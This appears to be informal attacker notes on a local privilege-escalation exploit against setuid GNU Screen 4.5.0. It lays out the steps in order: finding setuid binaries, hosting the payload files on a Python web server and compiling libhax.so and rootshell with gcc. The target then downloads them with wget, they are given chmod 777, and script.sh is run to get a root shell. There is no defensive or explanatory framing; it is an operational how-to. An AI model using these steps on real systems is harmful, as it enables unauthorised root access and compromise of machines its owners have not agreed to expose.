if screen 4.5.0 is in the setuid binaries(find / -perm -u=s -type f 2>/dev/null) you can try to priv esc locally without metasploit

to do this you need to start a python server: sudo python -m SimpleHTTPServer 80 in the directory with these files

from there make sure you upload all thre files: rootshell, libhax.so, and script.sh

if these are unavailable you can just recompile the libhax.c and the rootshell.c files using the commands below:
libhax.so ----> gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rootshell ----> gcc -o /tmp/rootshell /tmp/rootshell.c

this should create both those files

no need to compile the sh script because it is bash

but yeah after you're all sorted and have your files made you can wget them from the target machine

chmod 777 each file

then run ./script.sh

after running this you should be able to get root!!!!
